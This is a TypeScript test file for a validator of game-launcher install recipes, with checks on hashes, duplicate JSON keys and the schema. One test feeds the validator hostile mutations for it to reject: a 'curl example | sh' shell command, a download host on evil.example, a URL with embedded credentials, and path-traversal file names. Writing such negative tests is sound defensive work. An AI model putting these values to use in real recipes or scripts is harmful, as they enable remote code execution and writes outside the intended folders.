// Negative cases for data that a future remote catalog must reject.
// Usage: bun test ./scripts/test-launcher-recipes.ts
import { describe, expect, test } from "bun:test";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { InvalidCatalog, parseStrict, read, ROOT, shape, validateCatalog, validateRecipe } from "./validate-launcher-recipes";

const schema = read(join(ROOT, "recipe.schema.json"));
const ids = new Set<string>(read(join(ROOT, "index.json")).sources.map((source: { id: string }) => source.id));
const recipe = () => read(join(ROOT, "recipes/ea-app.json"));

describe("launcher recipes", () => {
  test("catalog and hashes", () => {
    expect(validateCatalog()).toBe(3);
  });

  test("untrusted mutations are rejected", () => {
    const mutations: ((recipe: any) => void)[] = [
      r => { r.shell = "curl example | sh"; },
      r => { r.steps.push("shell"); },
      r => { r.download.url = "http://origin-a.akamaihd.net/setup.msi"; },
      r => { r.download.url = "https://evil.example/setup.msi"; },
      r => { r.download.url = "https://user:secret@origin-a.akamaihd.net/setup.msi"; },
      r => { r.download.filename = "../setup.msi"; },
      r => { r.executable.relative_paths = ["drive_c/../../unrelated.exe"]; },
      r => { r.executable.relative_globs = ["drive_c/**/launcher.exe"]; },
      r => { r.runners[0].backend = "wine"; },
      r => { r.dependencies.push({ verb: "arbitrary-script", evidence: ["ea-recipe"], reason: "test", status: "recipe-candidate", apply: "user-approved" }); },
      r => { r.download.evidence = ["nonexistent"]; },
      r => { r.validation.launch_tested = true; },
      r => { r.steps.splice(r.steps.indexOf("verify_executable"), 1); },
    ];
    mutations.forEach((mutation, index) => {
      const changed = recipe();
      mutation(changed);
      expect(() => validateRecipe(changed, schema, ids), `mutation ${index}`).toThrow(InvalidCatalog);
    });
  });

  test("duplicate JSON keys are rejected", () => {
    expect(() => parseStrict('{"id":"safe","id":"replaced"}')).toThrow("Duplicate JSON key");
    expect(parseStrict('{"a":[1,{"b":null}],"c":"\\u00e9"}')).toEqual({ a: [1, { b: null }], c: "é" });
  });

  test("index rejects changed recipe bytes", () => {
    const folder = mkdtempSync(join(tmpdir(), "peligames-recipes-"));
    try {
      const root = join(folder, "installers");
      cpSync(ROOT, root, { recursive: true });
      const path = join(root, "recipes/ea-app.json");
      writeFileSync(path, readFileSync(path, "utf8") + " ");
      expect(() => validateCatalog(root)).toThrow("hash mismatch");
    } finally {
      rmSync(folder, { recursive: true, force: true });
    }
  });

  test("schema rejects unknown keyword", () => {
    expect(() => shape(recipe(), { ...schema, unsupported: true })).toThrow(InvalidCatalog);
  });
});
